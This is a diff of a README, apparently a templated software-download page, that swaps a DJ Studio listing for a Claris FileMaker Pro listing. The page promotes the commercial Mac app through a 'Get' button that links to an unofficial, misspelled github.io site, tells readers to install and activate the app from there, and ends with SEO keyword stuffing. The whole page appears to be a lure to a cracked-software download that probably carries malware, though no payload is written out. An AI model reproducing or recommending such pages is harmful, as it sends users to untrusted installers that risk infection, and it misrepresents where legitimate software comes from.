@@ -1,12 +1,12 @@
-# DJ Studio – Creative Mixing & Music Production Platform for macOS  
+# Claris FileMaker Pro – Powerful Database Creation & Business Solution Platform
 <div align="center">
-  <img src="https://media.imgcdn.org/repo/2024/01/dj-studio-pro/65a671044065d-dj-studio-pro-Icon.webp" width="250"/>
+  <img src="https://www.portagebay.com/wp-content/uploads/2020/05/FMP_icon.png" width="350"/>
 </div>  
 <br>
 
 <p align="center">
-  <a href="https://osx-aplications.github.io/.github/djstudio">
-    <img src="https://img.shields.io/badge/Get%20DJ%20Studio-green?style=for-the-badge&logo=apple&logoColor=white" alt="Get DJ Studio">
+  <a href="https://osx-aplications.github.io/.github/claris">
+    <img src="https://img.shields.io/badge/Get%20Claris%20FileMaker%20Pro-green?style=for-the-badge&logo=apple&logoColor=white" alt="Get Claris FileMaker Pro">
   </a>
 </p>
 
@@ -14,23 +14,23 @@
 
 # Installation Instructions  
 1. Go To The Website Using The Button Above.  
-2. Follow The On-Screen Steps To Install And Activate DJ Studio On Your Mac Device.
+2. Follow The On-Screen Steps To Install And Activate Claris FileMaker Pro On Your Mac Device.
 
 ---
 
 <div align="center">
-  <img src="https://static.kvraudio.com/i/b/2_studio.png" width="1080"/>
+  <img src="https://www.claris.com/cms/blog/images/cms/1953.png" width="1080"/>
 </div>  
 <br>
 
-## 🎛️ Overview  
-**DJ Studio** is a next-generation **audio mixing and production suite** for **macOS**, designed to empower DJs, producers, and music creators with professional tools for live performance and studio work.  
-It blends creativity with precision — combining smooth real-time mixing, advanced sound processing, and hardware integration into one powerful platform.  
+## 🧩 Overview  
+**Claris FileMaker Pro** is a robust and flexible **database development platform** created by **Claris International**, a subsidiary of Apple.  
+It enables individuals and organizations to build custom applications that streamline workflows, manage data efficiently, and connect seamlessly across devices.  
 
-Featuring automatic BPM sync, waveform visualization, and performance-grade effects, **DJ Studio** delivers a fluid, responsive experience tailored for both beginners and professionals.  
-It supports industry-standard controllers from **Pioneer**, **Behringer**, and **Native Instruments**, ensuring seamless workflow integration.  
+From inventory tracking to CRM systems and project management dashboards, **FileMaker Pro** provides the tools to turn ideas into fully functional business solutions — all without extensive programming knowledge.  
+It combines a visual design interface with powerful automation, scripting, and integration capabilities, allowing professionals to create scalable systems that evolve with their business needs.  
 
-Built to take full advantage of **Apple Silicon (M1/M2)** architecture, it offers exceptional speed, minimal latency, and stability during high-intensity sets or long studio sessions.
+Designed for **macOS**, **Claris FileMaker Pro** integrates perfectly with **Claris Cloud**, **Claris Studio**, and **FileMaker Server**, supporting real-time collaboration and secure data sharing.
 
 ---
 
@@ -38,12 +38,12 @@ Built to take full advantage of **Apple Silicon (M1/M2)** architecture, it offer
 
 | Feature | Description |  
 |-------------------------------------|------------------------------------------------------------------------------|  
-| 🎚️ **Dual Deck Mixing System** | Mix and manipulate multiple tracks with smooth crossfades and looping. |  
-| 🎵 **Precision Beat Matching** | Automatic BPM detection and sync for tight, professional transitions. |  
-| 🪩 **Studio-Quality FX Rack** | Apply filters, delays, reverbs, and EQ adjustments in real time. |  
-| 🎧 **Hardware Controller Support** | Works seamlessly with popular Pioneer, Behringer CMD, and Traktor devices. |  
-| 💽 **Live Recording & Export** | Capture your sessions and export in high-definition audio formats. |  
-| ⚡ **Optimized for macOS** | Full Apple Silicon optimization for superior responsiveness and stability. |  
+| 🧠 **Visual App Builder** | Design and customize business applications with drag-and-drop simplicity. |  
+| ☁️ **Cloud Integration** | Connect effortlessly with Claris Cloud and sync databases in real time. |  
+| 🔒 **Advanced Security** | Includes account encryption, SSL certificates, and role-based access. |  
+| 🔄 **Automation & Scripting** | Automate workflows with built-in scripting tools and triggers. |  
+| 🌐 **Web & Mobile Access** | Deploy solutions to web and mobile through FileMaker WebDirect and Go. |  
+| ⚡ **Optimized for macOS** | Fully native performance with M1/M2 support and Apple ecosystem integration. |  
 
 ---
 
@@ -53,11 +53,11 @@ Built to take full advantage of **Apple Silicon (M1/M2)** architecture, it offer
 |---------------|-----------------------------------|  
 | OS | macOS 11.0 or later |  
 | Processor | Apple Silicon (M1/M2) or Intel |  
-| Memory | 8 GB RAM (16 GB recommended) |  
-| Storage | 1 GB of free disk space |  
+| Memory | 4 GB RAM (8 GB recommended) |  
+| Storage | 2 GB of available disk space |  
 | Display | 1280×800 resolution or higher |  
 
 ---
 
 ## 🏷️ Tags  
-dj studio • dj studio mac • serato studio • pioneer vm 80 • vtech kidi superstar dj studio • pioneer dj vm 80 • dj studio near me • online mixing services • pioneer vm 70 • pioneer dj vm 50 • pioneer vm 50 • dj monitors • dj studio download • cmd studio 4a • behringer cmd studio 2a • traktor dj studio • pioneer dj hrm 5 • serato sample fl studio • pioneer hrm 5 • dj studio software • behringer cmd • mixmeister studio • serato studios • pioneer monitors • moving dj lights • dj studio 5 • dj studio for pc
+claris filemaker pro • claris filemaker • claris • claris mac • claris file maker • filemaker webdirect • claris studio • claris cloud • claris filemaker server • claris filemaker webdirect • claris pro • claris filemaker go 19 • filemaker pro claris • claris apple • claris international • claris filemaker download • claris international inc • myclaris • file maker claris • claris biotherapeutics
